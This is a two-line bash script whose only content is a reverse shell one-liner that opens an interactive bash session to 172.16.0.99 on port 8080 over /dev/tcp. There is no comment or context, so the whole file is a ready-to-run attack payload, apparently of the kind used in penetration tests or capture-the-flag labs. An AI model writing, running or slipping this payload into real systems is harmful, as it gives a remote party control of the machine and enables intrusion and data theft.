#!/bin/bash
bash -i >& /dev/tcp/172.16.0.99/8080 0>&1
